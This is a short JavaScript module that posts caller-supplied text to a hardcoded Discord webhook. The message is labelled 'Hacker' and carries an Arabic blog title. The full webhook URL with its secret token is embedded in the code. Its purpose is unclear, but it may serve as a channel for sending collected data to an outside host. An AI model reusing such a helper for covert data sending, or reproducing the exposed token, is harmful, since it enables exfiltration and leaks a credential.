import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة زاجل ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325116928242487367/Xe8bQ6bdWw-pjtvoKv-SQ4aOnLOUDxAstV20Mupx9rJw6m_7eMqOAM0vRh3WuO3glP02",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
